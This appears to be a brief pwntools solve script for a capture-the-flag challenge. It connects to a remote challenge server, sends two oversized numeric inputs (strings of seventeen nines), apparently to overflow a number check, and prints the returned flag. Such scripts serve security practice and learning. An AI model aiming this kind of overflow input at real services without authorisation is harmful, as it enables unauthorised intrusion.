from pwn import *

io = remote('rivit.dev', 10009)

num1 = '9' * 17
io.sendlineafter(b':', num1)

num2 = '9' * 17
io.sendlineafter(b':', num2)
io.recv()

flag = io.recv()
success(flag)

